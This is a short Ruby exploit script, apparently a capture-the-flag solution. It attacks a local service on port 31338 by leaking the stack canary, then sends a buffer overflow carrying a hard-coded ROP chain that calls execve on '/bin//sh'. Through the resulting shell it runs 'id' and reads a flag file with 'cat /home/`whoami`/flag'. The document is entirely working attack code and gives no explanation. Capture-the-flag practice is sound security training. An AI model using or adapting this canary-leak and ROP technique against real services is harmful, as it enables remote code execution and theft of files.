host, port = '127.0.0.1', 31338
$z = Sock.new host, port
def z;$z;end
context.arch = 'amd64' 

z.write('A' * 25)
canary = u64("\x00" + z.gets[25, 7])
log.info('canary: ' + canary.hex)

rop = flat(
  0x4017f7,
  0x6cc080,
  0x47a6e6,
  '/bin//sh', 'A' * 16,
  0x475fc1,
  0x4017f7,
  0x6cc088,
  0x42732f,
  0x475fc1,
  0x4005d5,
  0x6cc080,
  0x4017f7,
  0x6cc088,
  0x47a6e6,
  59, 0, 0,
  0x468e75
)
z.write('A' * 24 + canary.p64 + 'A' * 8 + rop)
z.gets
z.puts 'exit'

z.puts('id')
z.puts('cat /home/`whoami`/flag')
z.puts('exit')

loop do
  s = z.gets
  break if s.empty?
  puts s
end

STDOUT.puts('[EOF]')
